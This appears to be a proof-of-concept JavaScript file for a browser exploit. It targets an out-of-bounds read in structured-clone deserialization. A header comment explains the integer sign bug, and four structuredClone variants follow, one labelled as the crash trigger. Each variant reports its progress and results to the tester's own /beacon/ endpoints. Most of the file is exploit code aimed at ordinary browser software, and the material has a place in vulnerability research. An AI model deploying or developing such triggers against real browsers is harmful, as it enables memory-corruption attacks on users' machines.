// candidate (b) — MarkedVector m_size int OOB + BigInt wire width desync (DS-PRO-PSY trigger)
// Based on dsvpro3 P2: 65536 BigInts push m_gcBuffer.size() ≥ 0x10000; duplicate
// ObjectReferenceTag index bytes 0x02_00_00_80 → uint32 0x80000102 seen as int (-2147483390);
// at(int i) guards only i >= m_size (int), passes negative → m_buffer[i] OOB READ before buffer.
(function () {
  var nonce = "cb" + Date.now().toString(36);
  function beaconP(path, obj) {
    try {
      fetch(path, { method: "POST", cache: "no-store",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(obj || {}) }).catch(function () {});
    } catch (e) {}
  }
  function variant(id, label, fn) {
    try {
      beaconP("/beacon/cb-A" + id + "/" + nonce, { label: label, ua: navigator.userAgent.slice(0, 48) });
      var out = fn();
      beaconP("/beacon/cb-B" + id + "/" + nonce, { label: label, out: String(out).slice(0, 120) });
    } catch (e) {
      beaconP("/beacon/cb-E" + id + "/" + nonce, { label: label, err: String(e).slice(0, 140) });
    }
  }

  // variant 0: SAFE dedup-discriminator (huge BigInt pile then dup ObjectReferenceTag through a fresh object)
  variant(0, "safe-dedup-discriminator", function () {
    var arr = [ new Array(65536).fill().map(function (_, i) { return 1n << (40n + BigInt(i % 60)); }),
                { m: 0x51 }, { m: 0x51 }, new Array(3) ];
    var ok = structuredClone(arr);
    return "clone-size-k=" + ok.length;
  });

  // variant 1: CRASH-CLASS — big BigInt pile + 0x8000-shaped array; expected OOB at(-2147483390)
  variant(1, "oob-trigger", function () {
    var arr = [ new Array(65536).fill().map(function (_, i) { return 1n << (40n + BigInt(i % 60)); }),
                { m: 0x51 }, { m: 0x51 }, new Array(0x8000) ];
    var out = structuredClone(arr);
    return "returned len " + out.length;
  });

  // variant 2: BigInt wire width desync (m_objectPool vs m_gcBuffer straddling 0xFF/0xFFFF)
  variant(2, "bigint-width-desync", function () {
    var arr = [];
    for (var i = 0; i < 260; i++) arr.push(i === 255 ? 1n : ("str" + i));
    var ok = structuredClone(arr);
    return "desync-clone len " + ok.length + "; typeof0=" + typeof ok[255];
  });

  // variant 3: readback-adjacent probe — a JSON-safe object clone spanning the boundary
  variant(3, "boundary-span", function () {
    var arr = [ { x: 1 }, new Array(133), new Array(133), { y: 2 } ];
    var ok = structuredClone(arr);
    return "roundtrip " + (JSON.stringify([ok[0], ok[3]]) === JSON.stringify([{ x: 1 }, { y: 2 }]));
  });
})();
